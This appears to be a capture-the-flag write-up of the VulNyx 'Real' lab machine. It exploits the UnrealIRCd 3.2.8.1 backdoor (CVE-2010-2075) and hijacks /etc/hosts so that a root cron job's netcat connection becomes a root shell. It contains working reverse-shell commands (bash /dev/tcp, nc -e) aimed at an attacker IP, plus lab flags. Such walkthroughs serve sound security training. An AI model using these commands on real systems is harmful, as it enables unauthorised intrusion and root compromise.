---
title: "Real | VulNyx Writeup"
date: 2026-09-24T18:00:06+05:30
description: "VulNyx Real writeup covering UnrealIRCd enumeration, CVE-2010-2075 exploitation, root cron enumeration, writable /etc/hosts, hostname resolution hijacking, and root privilege escalation."
summary: "Compromised the Real machine by exploiting the UnrealIRCd 3.2.8.1 backdoor to obtain a server shell, discovering a root cron job that connected to shelly.real.nyx, redirecting the hostname through a writable /etc/hosts file, and receiving a root shell."
platform: "vulnyx"
difficulty: "low"
os: "Linux"
status: "active"
featured: false
featured_image: "/images/writeups/vulnyx/Real.png"
tags: ["linux", "unrealircd", "irc", "cve-2010-2075", "rce", "remote-code-execution", "reverse-shell", "pspy", "cron", "scheduled-task", "etc-hosts", "hostname-resolution", "network-hijacking", "privilege-escalation"]
skills: ["nmap", "unrealircd", "irc-enumeration", "cve-2010-2075", "python", "rce", "netcat", "pspy", "cron", "linux-enumeration", "hostname-resolution", "etc-hosts", "reverse-shell", "privilege-escalation"]
comments: false
draft: false
---

## Overview

<img width="842" height="438" alt="real-vulnyx" src="/images/writeups/vulnyx/Real.png" />

Real is an easy VulNyx machine that focuses on UnrealIRCd exploitation, cron enumeration, hostname resolution hijacking, and root privilege escalation.

The attack chain moves from UnrealIRCd → `server` through CVE-2010-2075 → root through a root cron job, a writable `/etc/hosts`, and controlled hostname resolution.

### Key Vulnerabilities

- UnrealIRCd 3.2.8.1 Backdoor
- CVE-2010-2075
- Unauthenticated Remote Code Execution
- Root Cron Job
- Privileged Network Connection
- Writable `/etc/hosts`
- Hostname Resolution Hijacking
- Root Reverse Shell
- Root Privilege Escalation

---

## 🔎 Enumeration

### Nmap Scan

First, perform a full TCP port scan with service and version detection:

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.91
```

#### Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.91
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 03:52 -0700
Nmap scan report for 192.168.1.91
Host is up (0.00011s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 db:28:2b:ab:63:2a:0e:d5:ea:18:8d:2f:6d:8c:45:2d (RSA)
|   256 cd:a1:c3:2e:20:f0:f3:f6:d3:9b:27:8e:9a:2d:26:11 (ECDSA)
|_  256 db:98:69:a5:8b:bd:05:86:16:3d:9c:8b:30:7b:a3:6c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 00:0C:29:16:34:9A (VMware)
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```

The scan reveals five open TCP ports:

- **22/tcp** — SSH
- **80/tcp** — HTTP
- **6667/tcp** — IRC UnrealIRCd
- **6697/tcp** — IRC UnrealIRCd
- **8067/tcp** — IRC UnrealIRCd

The most interesting service is **UnrealIRCd**, which is exposed on three ports.

---

## 🌐 Web Enumeration

First, inspect the HTTP service on port 80.

<img width="1918" height="938" alt="image" src="https://github.com/user-attachments/assets/3108159f-33fa-483e-b62a-6f4cea5bf689" />

The website displays the standard Apache Debian landing page:

```text
Apache2 Debian Default Page: It works
```

Directory and subdomain enumeration was also performed, but no useful information was discovered.

Since the web service does not provide an obvious attack path, attention is shifted to the IRC service identified by Nmap.

---

## 💬 UnrealIRCd Enumeration

Nmap identifies:

```text
UnrealIRCd
```


Searching for known vulnerabilities affecting UnrealIRCd reveals a well-known backdoor in: `UnrealIRCd 3.2.8.1`

The vulnerability is:
```
CVE-2010-2075
```

`CVE-2010-2075` is a backdoor vulnerability in `UnrealIRCd 3.2.8.1` that can allow an unauthenticated remote attacker to execute arbitrary system commands.

---

## 💥 Exploiting CVE-2010-2075

A public PoC was used:

```bash
wget https://raw.githubusercontent.com/FredBrave/CVE-2010-2075-UnrealIRCd-3.2.8.1/refs/heads/main/CVE-2010-2075.py
```

Before executing the exploit, start a Netcat listener:

```bash
nc -lnvp 443
```

Then execute the exploit against the IRC service:

```bash
python3 CVE-2010-2075.py -t 192.168.1.91 -p 6667 \
-c 'bash -c "bash -i >& /dev/tcp/192.168.1.28/443 0>&1"'
```

The exploit sends the payload.

The listener receives a connection:

```text
listening on [any] 443 ...

connect to [192.168.1.28] from (UNKNOWN) [192.168.1.91] 48946
bash: cannot set terminal process group (485): Inappropriate ioctl for device
bash: no job control in this shell
server@real:~/irc/Unreal3.2$ id ; hostname
id ; hostname
uid=1000(server) gid=1000(server) groups=1000(server)
real
server@real:~/irc/Unreal3.2$
```

We now have an initial shell as: `server`

---

## 🖥️ Reverse Shell TTY Upgrade

The initial reverse shell does not provide a fully interactive terminal.

Upgrade it using:

```bash
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then run:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the terminal environment:

```bash
export TERM=xterm
export BASH=bash
```

Adjust the terminal size:

```bash
stty size && stty sane && stty cols $(tput cols) rows $(tput lines)
```

If required:

```bash
stty cols 160 rows 45
```

The reverse shell is now upgraded to a usable interactive TTY.

---

## 🔐 Privilege Escalation Enumeration

Standard privilege-escalation checks were performed, including:

- SUID files
- Linux capabilities
- `sudo -l`
- Other local privilege-escalation opportunities

Nothing immediately useful was discovered.

The next step was to monitor scheduled processes using `pspy`.

---

## ⏰ Cron Enumeration with pspy

Download `pspy64`:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Make it executable:

```bash
chmod +x pspy64
```

Run it:

```bash
./pspy64
```

After waiting for the scheduled task, the following processes appear:

```text
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/09/24 07:34:01 CMD: UID=33    PID=1097   | ./pspy64 
2026/09/24 07:34:01 CMD: UID=0     PID=1096   | 
2026/09/24 07:34:01 CMD: UID=0     PID=1225   | /usr/sbin/CRON -f
2026/09/24 07:34:01 CMD: UID=0     PID=1226   | /bin/sh -c /opt/task
2026/09/24 07:34:01 CMD: UID=0     PID=1227   | /bin/bash /opt/task
2026/09/24 07:34:01 CMD: UID=0     PID=1228   | timeout 1 bash -c /usr/bin/ping -c 1 shelly.real.nyx
```

This reveals an important detail:

```text
/opt/task
```

is executed by the root cron process.

The command is executed as: `UID=0` meaning the task runs with `root` privileges.

---

## 📜 Inspecting `/opt/task`

Read the script:

```bash
cat /opt/task
```

Contents:

```bash
#!/bin/bash

domain='shelly.real.nyx'

function check(){

        timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 0
    else
        exit 1
    fi
}

check
```

The script performs the following operations:
Defines the hostname: `shelly.real.nyx` attempts to ping that hostname. 
If the ping succeeds, it executes: `/usr/bin/nohup nc -e /usr/bin/sh $domain 65000` .
This connects to TCP port `65000` on the resolved host and attaches `/usr/bin/sh` to the connection.
Because `/opt/task` is executed by the root cron process, the resulting shell runs with root privileges.

The important question becomes:

**How can we control where `shelly.real.nyx` resolves?**

---

## 📝 Inspecting `/etc/hosts`

Linux can use `/etc/hosts` for local hostname-to-IP resolution.

Check its permissions:

```bash
ls -la /etc/hosts
```

Output:

```text
server@real:~$ ls -la /etc/hosts
-rw----rw- 1 root root 183 May  3  2023 /etc/hosts
```

The permissions show that the file is writable by the `other` class.

This is a critical misconfiguration because an unprivileged user can modify local hostname resolution.

---

## 🎯 Hostname Resolution Hijacking

Since  `/etc/hosts` is writable, the hostname can be mapped to the attacker's IP address.

Add the attacker's machine to `/etc/hosts`:

```text
127.0.0.1       localhost
1.2.3.4         real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.1.28    shelly.real.nyx
```

Now: `shelly.real.nyx` resolves to: `192.168.1.28` which is the attacker's machine.

---

## 🐚 Root Shell Through the Cron Job

Start a Netcat listener on port `65000`:

```bash
nc -lnvp 65000
```

Wait for the root cron job to execute `/opt/task`.

The listener receives the connection:

```text
$ nc -lnvp 65000
listening on [any] 65000 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.91] 33414
root@real:~# id ; hostname
id ; hostname
uid=0(root) gid=0(root) groups=0(root)
real
root@real:~# 
```

We have successfully obtained a root shell.

---

## 🏴 Flags

### User Flag

```bash
cat /home/server/user.txt
```

```text
root@real:~# cat /home/server/user.txt 
3b7fb7c1c8737a5c67dc513657e3efb3
```

### Root Flag

```bash
cat /root/root.txt
```

```text
root@real:~# cat /root/root.txt 
593ba7e2d1e66b12e1488d6ea30c8787
```

---

## 🧾 Summary

| Stage | Technique / Finding |
|---|---|
| **Reconnaissance** | Full TCP Nmap scan |
| **Web Enumeration** | Apache default page |
| **Service Discovery** | UnrealIRCd |
| **IRC Ports** | 6667, 6697, 8067 |
| **Initial Vulnerability** | UnrealIRCd 3.2.8.1 Backdoor |
| **CVE** | CVE-2010-2075 |
| **Initial Access** | Remote command execution |
| **Initial User** | `server` |
| **Enumeration** | pspy64 |
| **Scheduled Task** | `/opt/task` |
| **Scheduled Task User** | `root` |
| **Weakness** | Writable `/etc/hosts` |
| **Hostname** | `shelly.real.nyx` |
| **Redirection** | `shelly.real.nyx → 192.168.1.28` |
| **Root Access** | Root cron reverse shell |
| **User Flag** | `3b7fb7c1c8737a5c67dc513657e3efb3` |
| **Root Flag** | `593ba7e2d1e66b12e1488d6ea30c8787` |

---

## 🚀 Key Takeaways

- Perform a **full TCP port scan** when starting a machine.
- Do not focus exclusively on HTTP; unusual services such as IRC can contain the primary attack surface.
- Version identification is important when researching service-specific vulnerabilities.
- **CVE-2010-2075** can provide unauthenticated command execution against vulnerable UnrealIRCd 3.2.8.1 installations.
- `pspy` is useful for discovering commands executed by cron jobs that may not be immediately obvious.
- Always inspect scripts executed by privileged scheduled tasks.
- Be particularly careful when a root script performs network connections using a hostname.
- `/etc/hosts` should not be writable by unprivileged users.
- A writable hostname-resolution mechanism can allow an attacker to redirect privileged network connections.
- Combining a root cron job, attacker-controlled hostname resolution, and `nc -e /usr/bin/sh` resulted in direct root command execution.

---

